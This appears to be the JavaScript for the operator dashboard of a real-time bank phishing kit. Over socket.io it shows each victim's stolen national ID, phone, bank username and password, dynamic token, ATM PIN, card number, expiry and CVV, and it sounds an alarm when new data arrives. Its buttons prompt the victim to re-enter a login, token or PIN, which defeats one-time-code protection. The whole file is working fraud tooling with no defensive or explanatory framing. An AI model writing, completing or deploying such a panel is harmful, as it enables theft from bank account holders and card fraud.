//TODO CAMBIAR EL URL DEL SOCKET IO POR EL LINK DEL PANEL DE ADMINISTRACIÓN
let socket = io.connect("http://localhost:5000/");

function generateTableRow(data) {
  return `
    <tr>
      <th scope="row">${data.fuente}</th>
      <td>${data.name}</td>
      <td>${data.reg}</td>
      <td>${data.cl}</td>
      <td>${data.us}</td>
      <td>${data.ps}</td>
      <td>${data.din}</td>
      <td>${data.ccaj}</td>
      <td>${data.bn}</td>
      <td>${data.cr}</td>
      <td>${data.px}</td>
      <td>${data.vc}</td>
      <td>${data.status}</td>
    </tr>
  `;
}

function generateButtons(data) {
  const buttonActions = [
    { id: "us", label: "User", endpoint: "buttons/user" },
    { id: "new-us", label: "New User", endpoint: "buttons/newUser" },
    { id: "din", label: "Cdin", endpoint: "buttons/din" },
    { id: "newDin", label: "New Cdin", endpoint: "buttons/newdin" },
    { id: "tok", label: "Tok", endpoint: "buttons/token" },
    { id: "newtok", label: "New Tok", endpoint: "buttons/newToken" },
    { id: "ccaj", label: "Cajero", endpoint: "buttons/ccaj" },
    { id: "end", label: "End", endpoint: "buttons/finish" },
  ];

  return buttonActions
    .map(
      (action) =>
        `<button class="button" id="${action.id}-button-${data.reg}">${action.label}</button>`
    )
    .join("");
}

function attachButtonEvents(data) {
  const buttonActions = [
    { id: "us", endpoint: "buttons/user" },
    { id: "new-us", endpoint: "buttons/newUser" },
    { id: "din", endpoint: "buttons/din" },
    { id: "newDin", endpoint: "buttons/newdin" },
    { id: "tok", endpoint: "buttons/token" },
    { id: "newtok", endpoint: "buttons/newToken" },
    { id: "ccaj", endpoint: "buttons/ccaj" },
    { id: "end", endpoint: "buttons/finish" },
  ];

  buttonActions.forEach((action) => {
    const button = document.querySelector(`#${action.id}-button-${data.reg}`);
    button.addEventListener("click", function (event) {
      event.preventDefault();
      fetch(action.endpoint, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ id: data.cl }),
      })
        .then((response) => response.json())
        .then((result) => {
          console.log(result);
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    });
  });
}

function renderPanel(data, isActive) {
  const tableContent = generateTableRow(data);
  const buttonContent = isActive ? generateButtons(data) : "";

  return `
    <div class="${isActive ? "active" : ""} mb-3">
      <div class="table-responsive">
        <table class="table table-striped table-bordered table-sm text-muted">
          <thead class="small">
            <tr>
              <th scope="col">Fuente</th>
              <th scope="col">Nombre</th>
              <th scope="col">CC</th>
              <th scope="col">Teléfono</th>
              <th scope="col">Usuario</th>
              <th scope="col">Contraseña</th>
              <th scope="col">Dinámica</th>
              <th scope="col">Cajero</th>
              <th scope="col">Banco</th>
              <th scope="col">Tarjetas</th>
              <th scope="col">EXP</th>
              <th scope="col">CVV</th>
              <th scope="col">Estado</th>
            </tr>
          </thead>
          <tbody class="small">
            ${tableContent}
          </tbody>
        </table>
      </div>
      ${isActive ? `<div class="d-flex gap-3">${buttonContent}</div>` : ""}
    </div>
  `;
}

socket.on("new_info", function (data) {
  let audio = new Audio("../static/audio/timbre.mp3");

  let intervalId = setInterval(() => {
    audio.play().catch(function (error) {
      console.log("Error al reproducir el audio:", error);
    });
  }, 1000);

  setTimeout(() => {
    clearInterval(intervalId);
  }, 5000);

  const content = document.getElementById("on-info");
  let panel = document.getElementById("panel-" + data.reg);

  if (!panel) {
    console.log("No existe el panel");
    panel = document.createElement("div");
    panel.id = "panel-" + data.reg;
    content.appendChild(panel);
  }

  const isActive = data.status !== "Finalizado";
  panel.innerHTML = renderPanel(data, isActive);

  if (isActive) {
    attachButtonEvents(data);
  }

  content.prepend(panel);
});
